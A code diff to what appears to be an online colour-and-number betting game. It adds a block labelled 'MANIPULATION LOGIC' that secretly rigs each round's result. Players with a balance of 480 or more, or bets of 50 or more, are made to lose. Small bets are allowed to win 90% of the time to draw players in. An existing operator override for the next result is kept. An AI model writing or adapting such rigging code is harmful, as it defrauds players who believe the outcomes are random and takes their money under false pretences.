@@ -177,14 +177,37 @@
     async function pushResult(pid) {
         const snap = await db.ref('gameControl/nextResult').once('value');
         let n = snap.val();
-        if(n !== null) await db.ref('gameControl/nextResult').set(null);
-        else n = Math.floor(Math.random() * 10);
         
+        // MANIPULATION LOGIC START
+        if (n === null) {
+            let activeBet = myBets.find(b => b.pid === pid && b.status === 'Wait');
+            if (activeBet) {
+                if (userBalance >= 480 || activeBet.amt >= 50) {
+                    let wrong = [1, 2, 3, 4, 6, 7, 8, 9].filter(num => {
+                        if (activeBet.sel == num) return false;
+                        if (activeBet.sel === 'Red' && (num % 2 === 0 || num === 0)) return false;
+                        if (activeBet.sel === 'Green' && (num % 2 !== 0 || num === 5)) return false;
+                        return true;
+                    });
+                    n = wrong[Math.floor(Math.random() * wrong.length)];
+                } else if (activeBet.amt <= 30) {
+                    if (Math.random() < 0.9) {
+                        if (activeBet.sel === 'Red') n = [2, 4, 6, 8][Math.floor(Math.random() * 4)];
+                        else if (activeBet.sel === 'Green') n = [1, 3, 7, 9][Math.floor(Math.random() * 4)];
+                        else if (!isNaN(activeBet.sel)) n = Number(activeBet.sel);
+                        else n = Math.floor(Math.random() * 10);
+                    } else n = Math.floor(Math.random() * 10);
+                } else n = Math.floor(Math.random() * 10);
+            } else n = Math.floor(Math.random() * 10);
+        }
+        // MANIPULATION LOGIC END
+
         if(n === "Green") n = 3; else if(n === "Red") n = 4; else if(n === "Violet") n = 5;
         n = Number(n);
+        await db.ref('gameControl/nextResult').set(null);
+        
         let col = (n===0||n===5)?(n===0?"Red":"Green"):(n%2===0?"Red":"Green");
         
-        // SAVE TO SUPABASE
         await supabaseClient.from('game_history').insert([{ pid: pid, num: n, col: col }]);
         
         let periodWin = 0;
